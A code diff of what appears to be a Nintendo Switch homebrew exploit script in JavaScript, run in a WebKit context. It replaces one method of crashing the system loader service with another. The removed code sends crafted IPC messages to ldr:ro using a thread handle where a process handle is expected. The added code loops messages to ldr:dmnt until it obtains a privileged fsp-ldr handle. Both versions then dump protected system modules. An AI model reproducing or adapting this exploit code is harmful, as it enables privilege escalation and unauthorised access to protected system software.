@@ -65,52 +65,30 @@ function dumpModule(module, loader, name) {
 	});
 }
 
-utils.log("stage1, getting webkit ldr:ro handle");
-//We are reusing WebKit's ldr:ro session
-var ldrro_mng_ptr = utils.add2(sc.mainaddr, 0x955558);
-//utils.log('ldr:ro management str base ptr is: ' + utils.paddr(ldrro_mng_ptr));
-var ldrro_mng = sc.read8(ldrro_mng_ptr);
-//utils.log('ldr:ro management str base is: ' + utils.paddr(ldrro_mng));
-var ldrro = sc.read8(utils.add2(ldrro_mng, 0xc));
-//utils.log('ldr:ro handle is: 0x' + ldrro[0].toString(16));
 
-utils.log("stage2, connecting to ldr:ro");
-
-//Most of what's below is unecessary but we needed to setup a fake nrr in memory through
-//LoadNrr to call LoadNro, being the function that allows us to crash loader.
-var nrobase = sc.malloc(0x1000 + 0xfff);
-var nrrbase = sc.malloc(0x1000 + 0xfff);
-var nrrSize = 0x1000;
-var nroSize = 0x1000;
-var bssSize = 0x900;
-
-//We initialize with a Thread Handle, 0xffff8000 instead of current process handle, 0xffff8001
-sc.ipcMsg(4).datau64(0).sendPid().copyHandle(0xffff8000).sendTo(ldrro);
-//We setup a fake nrr loading sequence
-sc.ipcMsg(2).datau64(0, nrrbase, nrrSize).sendPid().sendTo(ldrro);
-
-utils.log("stage3, crashing ldr:ro");
-//Just calling a normal cmd0 will crash since it will call svcMapProcessCodeMemory during LoadNro sequence using a
-//thread handle, attempting a process handle. This happens because svcGetProcessInfo in ldr:ro initialize can also take up
-//a Thread Handle as an argument, while svcMapProcessCodeMemory will bug out on it
-var res =sc.ipcMsg(0).datau64(0, nrobase, nroSize, utils.add2(nrobase, nroSize), bssSize).sendPid().sendTo(ldrro);
-
-//Those are useless so better free them now
-sc.free(nrobase);
-sc.free(nrrbase);
-
-utils.log("stage4, connecting to fsp");
-
-sc.getService("fsp-ldr", (hndle) => {
-	//utils.log("Got an handle to fsp: 0x" +hndle.toString(16));
-	utils.log("stage5, dumping sysmodule");
-	for (var name in modules) {
-		utils.log("dumping " + name);
-		try {
-			dumpModule(modules[name], hndle, name);
-			}
-			catch (e) {
-			}
+utils.log("stage1, crashing ldr");
+var i = 0;
+var srv = null;
+while (true) {
+	sc.ipcMsg(2).setType(5).sendTo('ldr:dmnt');
+	srv = sc.getService('fsp-ldr');
+	if (srv.isOk) {
+		utils.log('Boom.');
+		break;
 	}
-});
+	i++;
+}
 
+srv = srv.assertOk();
+utils.log('Got fsp-ldr handle after '+i+' iterations: ');
+utils.log('fsp-ldr handle: '+ srv);
+
+utils.log("stage2, dumping sysmodule");
+for (var name in modules) {
+	utils.log("dumping " + name);
+	try {
+		dumpModule(modules[name], srv, name);
+	}
+	catch (e) {
+	}
+};
